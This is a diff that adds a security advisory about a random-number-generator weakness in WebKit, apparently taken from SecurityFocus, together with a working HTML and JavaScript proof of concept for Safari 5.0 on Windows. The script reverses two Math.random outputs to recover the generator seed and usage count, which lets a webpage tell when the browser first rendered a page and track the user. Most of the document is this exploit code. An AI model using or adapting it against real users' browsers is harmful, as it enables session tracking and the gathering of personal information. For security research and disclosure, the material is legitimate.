@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/44952/info
+ 
+WebKit is prone to a random-number-generator weakness.
+ 
+Attackers can exploit this issue by enticing an unsuspecting user into visiting a malicious webpage.
+ 
+Successful attacks will allow attackers to track user sessions and obtain personal information that can aid in further attacks.
+ 
+NOTE: This issue was previously covered in BID 44938 (Apple Safari Prior to 5.0.3 and 4.1.3 Multiple Security Vulnerabilities) but has been given its own record to better document it.
+ 
+<html>
+<body>
+<script>
+document.write("userAgent: "+navigator.userAgent);
+</script>
+<br>
+<br>
+<div id="foo"></div>
+<form>
+<input type="button"
+      value="Calculate Safari 5.0 (Windows) PRNG seed and mileage"
+      onClick="calc_seed()">
+</form>
+<script>
+function calc_seed()
+{
+      r1=Math.random()*Math.pow(2,32);
+      r2=Math.random()*Math.pow(2,32);
+      H=r1;
+      L=(r2-(((H & 0xFFFF0000)>>>16) | ((H & 0x0000FFFF)<<16)))
+            & 0xFFFFFFFF;
+      // 10000 is just an arbitrary limit to make sure the
+      // algorithm doesn't run into an endless loop on
+      // non-vulnerable browsers
+      for (k=0;k<10000;k++)
+      {
+            L=(L-H) & 0xFFFFFFFF;
+            H=(H-L) & 0xFFFFFFFF;
+            H=((H & 0xFFFF0000)>>>16) | ((H & 0x0000FFFF)<<16);
+            if ((H^L)==0x49616E42)
+            {
+                  document.getElementById("foo").innerText=
+                        "PRNG Seed: "+H+" "+
+                        "(First page rendered: "+
+                              (new Date(H*1000)).toString()+")\n"+
+                        "PRNG mileage: "+k;
+                  return;
+            }
+      }
+      document.getElementById("foo").innerText=
+            "Could not find seed\n"+
+            "Are you sure it's Safari 5.0 for Windows?";
+      return;
+}
+</script>
+</body>
+</html>
